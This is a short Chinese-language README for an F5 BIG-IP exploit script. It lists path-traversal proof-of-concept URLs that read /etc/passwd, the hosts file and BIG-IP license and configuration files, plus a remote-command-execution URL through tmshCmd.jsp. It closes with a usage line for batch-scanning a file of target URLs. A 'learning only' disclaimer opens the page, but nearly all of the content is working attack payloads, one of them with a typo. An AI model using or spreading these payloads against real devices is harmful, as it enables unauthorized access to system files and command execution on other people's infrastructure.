# F5
所涉及的全部脚本仅限于学习交流，请勿非法使用，造成一切后果，均由使用者承担！！！
poc:
​
/tmuilogin.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
​
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts
​
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
​
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf
rce：
​
/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+use

python3.py F5.py -u url.txt -o out.txt

--u 指的是存放需要检测的链接；
--o 指的是存在漏洞的url；
